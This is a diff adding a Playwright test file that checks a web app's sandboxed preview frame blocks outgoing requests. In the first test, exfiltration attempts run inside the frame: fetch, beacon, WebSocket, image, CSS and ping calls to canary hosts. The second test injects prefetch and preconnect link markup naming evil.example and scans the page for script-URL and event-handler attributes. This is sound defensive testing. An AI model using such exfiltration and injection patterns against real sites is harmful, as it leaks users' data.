@@ -1,0 +1,528 @@
+import { randomBytes } from 'node:crypto';
+import { mkdtempSync, rmSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import path from 'node:path';
+import { fileURLToPath, pathToFileURL } from 'node:url';
+import { build } from 'esbuild';
+import type { Frame, Page, Request, Response } from '@playwright/test';
+import { expect, test } from '../harness/fixtures';
+import { recordViolations, violations } from '../harness/preview-document';
+import { DEMO_APP } from '../harness/profile-matrix';
+import { FALLBACK_ID, VARIANTS } from '../harness/registry';
+import { eventsOf, frameAt, mount, openDemoStudioPage } from '../harness/studio-channel-page';
+import type * as Hostile from '../../apps/web/src/lib/demo/import/test-support/hostile';
+import type * as Pipeline from '../../apps/web/src/lib/demo/import/pipeline';
+
+// Demo Studio's local preview frame in a browser (#9, 9-4b1; #7 AC11): the
+// test's Studio page, on the demo app's origin as Studio is, frames the real
+// /preview/local under Studio's sandbox, opens the channel with a nonce of
+// its own, and sends documents as Demo Studio will. The frame's own CSP
+// stays on: connect-src 'none' and img-src 'self' data: blob: are what this
+// shows live. Every request any page or frame makes is captured, and a
+// route on /__canary/ records any that would reach a server, on the app's
+// origin or another host. The test page's own requests show the capture
+// sees what goes out.
+
+const IMPORT_DIR = fileURLToPath(new URL('../../apps/web/src/lib/demo/import/', import.meta.url));
+const LOCAL = '/preview/local';
+const ANNOTATION = [
+  { type: 'route', description: LOCAL },
+  { type: 'profile', description: 'demo' },
+];
+/** A host no request may reach: any that got this far would show in the canary route. */
+const REMOTE = 'https://kgn-local-canary.invalid';
+/** A host of its own for each load a page makes unasked, so its violation says which one was tried. */
+const HOSTS = {
+  socket: 'kgn-socket-canary.invalid',
+  css: 'kgn-css-canary.invalid',
+  prefetch: 'kgn-prefetch-canary.invalid',
+  ping: 'kgn-ping-canary.invalid',
+} as const;
+
+// The frame's sockets meet its own connect-src: the harness routes no WebSocket
+// here, since Playwright's routing puts a mock in every frame in the browser's
+// place. And the frame is opaque, so it can't register a service worker
+// either way: allowing them only keeps Playwright's own init script, which
+// reads navigator.serviceWorker, from throwing in the frame.
+test.use({ appOptions: DEMO_APP, routeWebSockets: false, serviceWorkers: 'allow' });
+
+/** A file of the build's own that the frame may link: under /_next/static/ or /_portfolio/, plain path characters only. */
+const OWN_FILE = /^\/(?:_next\/static|_portfolio)\/[A-Za-z0-9._/-]+$/;
+
+// Allowing service workers registers none: the frame is opaque, and nothing here asks for one.
+test.afterEach(({ page }) => {
+  expect(page.context().serviceWorkers()).toEqual([]);
+});
+
+type Helpers = typeof Hostile & Pick<typeof Pipeline, 'runImport'>;
+let outdir: string | undefined;
+let H: Helpers;
+
+test.beforeAll(async () => {
+  // The import's own fixtures and pipeline, bundled for Node, as
+  // demo-import.spec.ts bundles them: Playwright's loader reads a TypeScript
+  // file beyond tests/ as CommonJS.
+  outdir = mkdtempSync(path.join(tmpdir(), 'kgn-local-frame-'));
+  const out = path.join(outdir, 'helpers.mjs');
+  const hostile = path.join(IMPORT_DIR, 'test-support', 'hostile.ts');
+  await build({
+    stdin: {
+      contents:
+        "export * from './test-support/hostile.ts';\nexport { runImport } from './pipeline.ts';\n",
+      resolveDir: IMPORT_DIR,
+      sourcefile: 'helpers.ts',
+      loader: 'ts',
+    },
+    bundle: true,
+    format: 'esm',
+    platform: 'node',
+    target: 'node22',
+    outfile: out,
+    banner: {
+      js: "import { createRequire as __kgnCreateRequire } from 'node:module'; const require = __kgnCreateRequire(import.meta.url);",
+    },
+    define: { 'import.meta.url': JSON.stringify(pathToFileURL(hostile).href) },
+    logLevel: 'silent',
+  });
+  H = (await import(pathToFileURL(out).href)) as Helpers;
+});
+
+test.afterAll(() => {
+  if (outdir) rmSync(outdir, { recursive: true, force: true });
+});
+
+/** The document message Studio sends for a pair of files: #137's import's own sources. */
+function documentOf(
+  files: ReturnType<Helpers['pairFiles']>,
+  selection: Record<string, string> = {},
+): { sources: unknown; selection: Record<string, string> } {
+  const imported = H.runImport(files);
+  if (imported.kind !== 'imported') throw new Error(`the pair didn't import: ${imported.kind}`);
+  return { sources: imported.unit.sources, selection };
+}
+
+/** Every request a page or frame of the context made, with what it carried. */
+interface Captured {
+  readonly url: string;
+  readonly text: string;
+  /** The error a request failed with, such as net::ERR_BLOCKED_BY_CSP, or null while it hasn't. */
+  failure: string | null;
+  /** Whether a response came back, or the request finished. */
+  answered: boolean;
+}
+
+/**
+ * What a CSP-blocked load fails with: the browser refused it, and nothing
+ * went out. Chromium reports net::ERR_BLOCKED_BY_CSP, and Playwright's
+ * `failure().errorText` gives it as `csp` for a subresource the policy
+ * blocked, as the image, the CSS url(), and the ping are.
+ */
+const BLOCKED: ReadonlySet<string> = new Set(['net::ERR_BLOCKED_BY_CSP', 'csp']);
+
+/**
+ * Every captured request that carries one of `markers` and wasn't refused by
+ * the policy before it left: one that got a response or finished, or failed
+ * any other way. A load the frame's CSP blocks still fires `request`, then
+ * `requestfailed` with net::ERR_BLOCKED_BY_CSP, and never reaches a server.
+ */
+function escaped(requests: readonly Captured[], markers: readonly string[]): string[] {
+  return (
+    requests
+      .filter(({ text }) => markers.some((marker) => text.includes(marker)))
+      // Left: it got a response or finished, or failed some way other than the policy's refusal.
+      .filter(({ failure, answered }) => answered || failure === null || !BLOCKED.has(failure))
+      .map(
+        ({ url, failure, answered }) =>
+          `${url} (${answered ? 'answered' : (failure ?? 'pending')})`,
+      )
+  );
+}
+
+/** Waits until every captured request carrying one of `markers` has failed or been answered. */
+async function settled(requests: readonly Captured[], markers: readonly string[]) {
+  await expect
+    .poll(
+      () =>
+        requests.filter(
+          ({ text, failure, answered }) =>
+            markers.some((marker) => text.includes(marker)) && failure === null && !answered,
+        ).length,
+    )
+    .toBe(0);
+}
+
+/**
+ * Opens the test's Studio page and frames /preview/local in it under
+ * Studio's sandbox, with the capture and the canary route on. Returns the
+ * frame once it said ready.
+ */
+async function openFrame(page: Page) {
+  const requests: Captured[] = [];
+  const byRequest = new Map<Request, Captured>();
+  const hits: string[] = [];
+  const dialogs: string[] = [];
+  const errors: string[] = [];
+  const context = page.context();
+  context.on('request', (request) => {
+    const captured: Captured = {
+      url: request.url(),
+      text: [request.url(), JSON.stringify(request.headers()), request.postData() ?? ''].join('\n'),
+      failure: null,
+      answered: false,
+    };
+    byRequest.set(request, captured);
+    requests.push(captured);
+  });
+  context.on('requestfailed', (request) => {
+    const captured = byRequest.get(request);
+    if (captured) captured.failure = request.failure()?.errorText ?? 'failed';
+  });
+  const answered = (request: Request) => {
+    const captured = byRequest.get(request);
+    if (captured) captured.answered = true;
+  };
+  context.on('response', (response: Response) => answered(response.request()));
+  context.on('requestfinished', answered);
+  // A socket that opens is answered: nothing the frame's policy blocks gets one.
+  page.on('websocket', (socket) =>
+    requests.push({ url: socket.url(), text: socket.url(), failure: null, answered: true }),
+  );
+  page.on('dialog', (dialog) => {
+    dialogs.push(dialog.type());
+    void dialog.dismiss();
+  });
+  page.on('pageerror', (error) => errors.push(String(error)));
+  // Anything that would reach a server under /__canary/, here or on another host.
+  await page.route('**/__canary/**', (route) => {
+    hits.push(route.request().url());
+    return route.fulfill({ status: 204, body: '' });
+  });
+  await recordViolations(page);
+  return { requests, hits, dialogs, errors };
+}
+
+/** Frames /preview/local on the test's Studio page with a fresh nonce, and waits for its ready. */
+async function framed(page: Page): Promise<Frame> {
+  const nonce = randomBytes(16).toString('base64url');
+  await mount(page, `${LOCAL}#nonce=${nonce}`, nonce);
+  await expect.poll(() => eventsOf(page, 'ready')).toEqual([{ renderedVersion: null, route: '/' }]);
+  return frameAt(page, LOCAL);
+}
+
+/** Sends Studio's `document`, and waits for the frame's status after it. */
+async function send(page: Page, document: unknown): Promise<unknown> {
+  const before = (await eventsOf(page, 'status')).length;
+  const sent = await page.evaluate(
+    (payload) => window.channel.send('document', payload as never),
+    document,
+  );
+  expect(sent, 'the channel is open').toBe(true);
+  await expect.poll(async () => (await eventsOf(page, 'status')).length).toBeGreaterThan(before);
+  return (await eventsOf(page, 'status')).at(-1);
+}
+
+test(
+  "the local frame renders the document Studio sends, and a script in it gets no HTTP or WebSocket request to any host, the app's own included: fetch, sendBeacon, a WebSocket, a remote image, a CSS url(), and a link's ping are refused before they leave (#9, #7 AC11)",
+  { annotation: ANNOTATION },
+  async ({ page, app, blockedRequests }) => {
+    const { requests, hits, dialogs, errors } = await openFrame(page);
+    await openDemoStudioPage(page, app);
+    // The capture sees what goes out: the test page's own requests reach the canary route.
+    await page.evaluate(async () => {
+      await fetch('/__canary/control-fetch');
+      await new Promise((resolve) => {
+        const image = new Image();
+        image.onload = image.onerror = resolve;
+        image.src = '/__canary/control-image';
+      });
+    });
+    await expect.poll(() => hits.length).toBe(2);
+    hits.length = 0;
+
+    const frame = await framed(page);
+    expect(await send(page, documentOf(H.pairFiles(H.EXAMPLE.portfolio)))).toEqual({
+      state: 'ready',
+    });
+    await expect(frame.locator('body')).toContainText('Anamika Devi');
+
+    // What a script in the frame would do to send something out. CSP runs it
+    // all, as a document's own script: the test runs it in the frame.
+    const marker = `kgn-local-script-${randomBytes(6).toString('hex')}`;
+    const host = new URL(app.origin).host;
+    const outcomes = await frame.evaluate(
+      async ({ origin, host: own, remote, marker: planted, hosts }) => {
+        const out: Record<string, string> = {};
+        const settle = (wait: Promise<string>) =>
+          Promise.race([
+            wait,
+            new Promise<string>((done) => setTimeout(() => done('timeout'), 3000)),
+          ]);
+        for (const [name, url] of [
+          ['fetch, own origin', `${origin}/__canary/fetch?${planted}`],
+          ['fetch, remote', `${remote}/__canary/fetch?${planted}`],
+        ] as const) {
+          out[name] = await fetch(url, { mode: 'no-cors', method: 'POST', body: planted }).then(
+            () => 'sent',
+            () => 'refused',
+          );
+        }
+        for (const [name, url] of [
+          ['beacon, own origin', `${origin}/__canary/beacon?${planted}`],
+          ['beacon, remote', `${remote}/__canary/beacon?${planted}`],
+        ] as const) {
+          try {
+            out[name] = navigator.sendBeacon(url, planted) ? 'queued' : 'refused';
+          } catch {
+            out[name] = 'refused';
+          }
+        }
+        for (const [name, url] of [
+          ['socket, own origin', `ws://${own}/__canary/socket?${planted}`],
+          ['socket, remote', `wss://${hosts.socket}/__canary/socket?${planted}`],
+        ] as const) {
+          try {
+            const socket = new WebSocket(url);
+            out[name] = await settle(
+              new Promise((done) => {
+                socket.onopen = () => done('open');
+                socket.onerror = () => done('refused');
+              }),
+            );
+          } catch {
+            out[name] = 'refused';
+          }
+        }
+        out['image, remote'] = await settle(
+          new Promise((done) => {
+            const image = new Image();
+            image.onload = () => done('loaded');
+            image.onerror = () => done('refused');
+            image.src = `${remote}/__canary/image.png?${planted}`;
+          }),
+        );
+        // What a page loads without a script asking: a CSS url(), a prefetch, and a link's ping.
+        // The prefetch is the residual: Chromium holds it to no directive (below).
+        document.body.style.backgroundImage = `url("https://${hosts.css}/__canary/css.png?${planted}")`;
+        const prefetch = document.createElement('link');
+        prefetch.rel = 'prefetch';
+        prefetch.href = `https://${hosts.prefetch}/__canary/prefetch?${planted}`;
+        document.head.append(prefetch);
+        const ownPrefetch = document.createElement('link');
+        ownPrefetch.rel = 'prefetch';
+        ownPrefetch.href = `${origin}/__canary/prefetch-own?${planted}`;
+        document.head.append(ownPrefetch);
+        const pinged = document.createElement('a');
+        pinged.href = '#canary-ping';
+        pinged.setAttribute(
+          'ping',
+          `https://${hosts.ping}/__canary/ping?${planted} ${origin}/__canary/ping-own?${planted}`,
+        );
+        pinged.textContent = 'ping';
+        document.body.append(pinged);
+        pinged.click();
+        // A beacon, a prefetch, or a ping goes out after the call returns, if it goes at all.
+        await new Promise((done) => setTimeout(done, 1500));
+        return out;
+      },
+      { origin: app.origin, host, remote: REMOTE, marker, hosts: HOSTS },
+    );
+    // fetch and the image fail, the sockets never open, and whatever a beacon queued never left.
+    // Soft, as each row of the violation table below is, so a policy that lets one through shows
+    // every case it breaks, not only the first.
+    expect.soft(outcomes).toMatchObject({
+      'fetch, own origin': 'refused',
+      'fetch, remote': 'refused',
+      'socket, own origin': 'refused',
+      'socket, remote': 'refused',
+      'image, remote': 'refused',
+    });
+    // The one residual, and only a script in the frame has it: Chromium holds
+    // <link rel=prefetch> to no CSP directive, not default-src 'none', and it
+    // has no prefetch-src, so both prefetches reach a server. Imported content
+    // can't add one (the next test), so the script would be the agent's or a
+    // registered composition's, which the owner chose (threat preview-7).
+    const prefetched = (url: string) => /\/__canary\/prefetch(?:-own)?\?/.test(url);
+    expect
+      .soft([...hits].sort(), 'only the two prefetches reached a server')
+      .toEqual(
+        [
+          `${app.origin}/__canary/prefetch-own?${marker}`,
+          `https://${HOSTS.prefetch}/__canary/prefetch?${marker}`,
+        ].sort(),
+      );
+    expect.soft(blockedRequests.filter((url) => url.includes(marker))).toEqual([]);
+    // Every other request the browser began with the marker was refused by
+    // the policy before it left: it failed with net::ERR_BLOCKED_BY_CSP, and
+    // got no response and never finished.
+    await settled(
+      requests.filter(({ url }) => !prefetched(url)),
+      [marker],
+    );
+    expect
+      .soft(
+        escaped(
+          requests.filter(({ url }) => !prefetched(url)),
+          [marker],
+        ),
+        'a request with the marker that left',
+      )
+      .toEqual([]);
+    // And the frame's policy is what stopped each, which shows each was tried:
+    // connect-src for both sockets, the fetches, and the ping, and img-src for
+    // the image and the CSS url().
+    const seen = await violations(frame);
+    const stopped = (directive: RegExp, needle: string) =>
+      seen.some((line) => directive.test(line) && line.includes(needle));
+    for (const [what, directive, needle] of [
+      ['the socket to its own host', /^connect-src blocked /, `ws://${host}`],
+      ['the socket to another host', /^connect-src blocked /, `wss://${HOSTS.socket}`],
+      ['the fetch to another host', /^connect-src blocked /, new URL(REMOTE).host],
+      ['the image', /^img-src blocked /, new URL(REMOTE).host],
+      ['the CSS url()', /^img-src blocked /, HOSTS.css],
+      ['the ping', /^connect-src blocked /, HOSTS.ping],
+    ] as const) {
+      expect
+        .soft(
+          stopped(directive, needle),
+          `${what} was tried, and the policy stopped it:\n${seen.join('\n')}`,
+        )
+        .toBe(true);
+    }
+    expect(dialogs).toEqual([]);
+    expect(errors).toEqual([]);
+  },
+);
+
+test(
+  'a document with markers in its text, its image and video sources, and its link URLs renders in every composition, with no request carrying any of them, and each hostile fixture the import takes renders inert (#9, #7 AC11)',
+  { annotation: ANNOTATION },
+  async ({ page, app, blockedRequests }) => {
+    test.setTimeout(180_000);
+    const { requests, hits, dialogs, errors } = await openFrame(page);
+    await openDemoStudioPage(page, app);
+    const frame = await framed(page);
+
+    const tag = randomBytes(6).toString('hex');
+    const MARKERS = {
+      text: `kgnlocaltext${tag}`,
+      image: `kgn-local-image-${tag}`,
+      video: `kgn-local-video-${tag}`,
+      link: `kgn-local-link-${tag}`,
+    };
+    const portfolio = H.portfolioWith((data) => {
+      (data.identity as Record<string, unknown>).name = `Anamika ${MARKERS.text}`;
+      const media = data.media as { source: string; kind: string }[];
+      media[0]!.source = `https://images.example.net/${MARKERS.image}.png`;
+      media[1]!.source = `https://media.example.net/${MARKERS.video}.mp4`;
+      media[1]!.kind = 'video';
+      (data.links as { url: string }[])[0]!.url = `https://links.example.net/${MARKERS.link}`;
+    });
+    const compositions = VARIANTS.map(({ manifest }) => manifest.id).filter(
+      (id) => id !== FALLBACK_ID,
+    );
+    expect(compositions.length).toBeGreaterThan(0);
+    for (const variant of compositions) {
+      expect(await send(page, documentOf(H.pairFiles(portfolio), { variant })), variant).toEqual({
+        state: 'ready',
+      });
+      await expect(
+        frame.locator(`[data-variant="${variant}"]`).first(),
+        `${variant} renders`,
+      ).toBeAttached();
+      // The text marker renders, as text: the document is the one sent.
+      expect(await frame.content(), variant).toContain(MARKERS.text);
+      // No element loads from a URL the content names.
+      const loads = await frame.evaluate(() =>
+        [...document.querySelectorAll('[src], [srcset], [poster], object[data]')].flatMap(
+          (element) =>
+            ['src', 'srcset', 'poster', 'data'].flatMap((name) => element.getAttribute(name) ?? []),
+        ),
+      );
+      for (const marker of [MARKERS.image, MARKERS.video]) {
+        expect(
+          loads.filter((url) => url.includes(marker)),
+          `${variant}: ${marker}`,
+        ).toEqual([]);
+      }
+    }
+
+    // The import's hostile fixtures that import render inert: nothing runs,
+    // and nothing they plant reaches an element, an attribute, or a request.
+    // Link markup in Markdown and plain-text fields: no <link> element content could have
+    // put there, so content can't start a prefetch (threat preview-7).
+    const LINKS = `<link rel="prefetch" href="https://evil.example/${H.CANARY}-prefetch"> <link rel=preconnect href=//evil.example/${H.CANARY}>`;
+    const linked = H.portfolioWith((data) => {
+      (data.practice as Record<string, unknown>).thesis = `Before ${LINKS} after.`;
+      (data.works as { summary?: string }[])[0]!.summary = LINKS;
+      (data.identity as Record<string, unknown>).tagline = LINKS;
+    });
+    expect(await send(page, documentOf(H.pairFiles(linked)))).toEqual({ state: 'ready' });
+    const links = await frame.evaluate(() =>
+      [...document.querySelectorAll('link')].map((link) => ({
+        html: link.outerHTML,
+        rel: link.rel.toLowerCase().trim(),
+        href: link.getAttribute('href') ?? '',
+      })),
+    );
+    // The frame's own links alone: a stylesheet, a preload, or a module
+    // preload of one of the build's files, under /_next/static/ or
+    // /_portfolio/ on the frame's own origin. Any other link, a prefetch or a
+    // preconnect above all, is one content could have put there.
+    expect(
+      links
+        .filter(
+          ({ rel, href }) =>
+            !/^(?:stylesheet|preload|modulepreload)$/.test(rel) ||
+            !OWN_FILE.test(href) ||
+            href.split('/').includes('..'),
+        )
+        .map(({ html }) => html),
+      "a link that isn't the frame's own",
+    ).toEqual([]);
+    expect(
+      links.filter(({ html }) => html.includes('evil.example') || html.includes(H.CANARY)),
+      'a link naming a planted host or value',
+    ).toEqual([]);
+
+    const fixtures = H.HOSTILE_FIXTURES.filter(({ expect: outcome }) => outcome === 'imported');
+    expect(fixtures.length).toBeGreaterThan(0);
+    for (const fixture of fixtures) {
+      expect(await send(page, documentOf(fixture.files)), fixture.name).toEqual({
+        state: 'ready',
+      });
+      const planted = await frame.evaluate(
+        (canary) =>
+          [...document.querySelectorAll('*')].flatMap((element) => [
+            ...(element.localName === 'script' && (element.textContent ?? '').includes(canary)
+              ? [`script: ${element.textContent}`]
+              : []),
+            ...[...element.attributes]
+              .filter(
+                ({ name, value }) =>
+                  /^on/i.test(name) ||
+                  value.includes(canary) ||
+                  /^\s*(?:javascript|vbscript|data:text)/i.test(value),
+              )
+              .map(({ name, value }) => `${element.localName} ${name}="${value}"`),
+          ]),
+        H.CANARY,
+      );
+      expect(planted, fixture.name).toEqual([]);
+    }
+
+    const all = [...Object.values(MARKERS), H.CANARY];
+    await settled(requests, all);
+    expect(escaped(requests, all), 'a request with a marker that left').toEqual([]);
+    expect(
+      requests
+        .filter(({ text }) => all.some((marker) => text.includes(marker)))
+        .map(({ url }) => url),
+    ).toEqual([]);
+    expect(blockedRequests.filter((url) => all.some((marker) => url.includes(marker)))).toEqual([]);
+    expect(hits).toEqual([]);
+    expect(dialogs).toEqual([]);
+    expect(errors).toEqual([]);
+    // Nothing the frame rendered asked for anything its policy refuses.
+    expect(await violations(frame)).toEqual([]);
+  },
+);
